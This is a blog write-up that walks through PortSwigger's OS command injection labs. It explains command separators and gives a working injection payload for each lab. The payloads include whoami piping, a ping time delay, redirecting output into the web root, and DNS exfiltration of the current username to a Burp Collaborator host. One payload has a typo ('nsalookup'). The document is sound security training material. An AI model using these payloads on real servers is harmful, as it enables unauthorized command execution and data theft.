---
title: 'OS command injection'
date: 2021-06-02 23:48:05
tags:
- PortSwigger
- injection
category:
- PortSwigger
index_img: /assets/images/os-command-injection.svg
banner_img: /assets/images/os-command-injection.svg
author: 'Mahmoud S. Atia'
description: 'in this blog i''ve explained how to solve OS command injection labs in PortSwigger'
subtitle: 'PortSwigger Writeup.'
---

# Note

I'll explain what OS command injection is, describe how vulnerabilities can be detected and exploited, spell out some useful commands and techniques for different operating systems, and summarize how to prevent OS command injection.

![](/assets/images/os-command-injection.svg)

# What is os command injection ?

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute an arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. Very often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization.

# What kind of damage can OS Command injections cause?

    • Infiltrate your local network
    • Access sensitive data
    • Upload or download certain data or malware
    • Create custom scripts
    • Run those scripts or other applications as administrators
    • Edit user security levels

# Detection 

By enumeration, you know the type of system that is running. These command separators work on both Windows and Unix-based systems:

`&` 
`&& `
`| `
`|| `

# The following command separators work only on Unix-based systems:

`;`
`Newline (0x0a or \n)`

> On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

`$( injected command )`
Grave Accent

- The ${IFS} means Internal Field Separator which is used for splitting words after expansion and to split lines into words. Its default value is 
> space tab newline
  

# PortSwigger OS command injection Labs

----

# Lab: OS command injection, simple case

We should determine the name of the current user so we should execute the whoami command.

we will inject `|whoami` after the storeId=

`storeId=2|whoami`

![](/assets/images/1-2-os.png)

# Lab: Blind OS command injection with time delays

I fined input in feedback page so let's test it.

![Swiss Alps](/assets/images/2-1-os.png)

Is is a blind os command injection so to exploit the blind OS command injection vulnerability to cause a 10 second delay `[-c 15 =number of icmp packets ]` it’ll cause delay for 15 s.
we will inject the payload after email=x
`email=H3X0S3@protonmail.com||ping+-c+15+127.0.0.1||`

![](/assets/images/2-2-os.png)

# Lab: Blind OS command injection with output redirection
We need to create a file that contains the output of whoami command and read it.

![Swiss Alps](/assets/images/3-1-os.png)

we will inject our payload on email=x
`email=H3X0S3@protonmail.com||whoami>/var/www/images/H3X0S3.txt||`

![](/assets/images/3-os.png)

then open any image and change the name of it to H3X0S3.txt you will get peter-LQMcuE
and the lab is solved.

![](/assets/images/3-2-os.png)

# Lab: Blind OS command injection with out-of-band interaction

This lab contains a blind OS command injection vulnerability in the feedback function. 
As in the previous lab Blind OS command injection with output redirection.
So, We need to receive dns interaction so we'll inject our payload with bup collaborator
we'll inject in email=x
payload is
`email=H3X0S3@protonmail.com||nslookup+x.burpcollaborator.net||`

![](/assets/images/4-os.png)

# Lab: Blind OS command injection with out-of-band data exfiltration

We need to know the name of the current user. So, we will inject our payload on email id 
email=||our-payload||
so we need to know the name of the current user and we will Receive the response on our Burp collaborator client
so the payload is
`email=H3X0S3@protonmail.com||nsalookup+``whoami`
`g9qq8gdxsp4vj9t56twthbv8vz1ppe.burpcollaborator.net||`
click Poll now

![](/assets/images/5-os.png)

You will see some DNS interactions then compare between the

`g9qq8gdxsp4vj9t56twthbv8vz1ppe.burpcollaborator.net`

and the description

`peter-PLQZsKg9qq8gdxsp4vj9t56twthbv8vz1ppe.burpcollaborator.net`

> **`Compare between`**
 
`g9qq8gdxsp4vj9t56twthbv8vz1ppe.burpcollaborator.net`
 > **`And`**

`peter-PLQZsKg9qq8gdxsp4vj9t56twthbv8vz1ppe.burpcollaborator.net`

the name of the current user is peter-pIQZsK

 ![](/assets/images/5-2-os.png)
 
 
 ![](https://i.giphy.com/media/3oFzmqN1xHwaEXGl7q/giphy.webp)
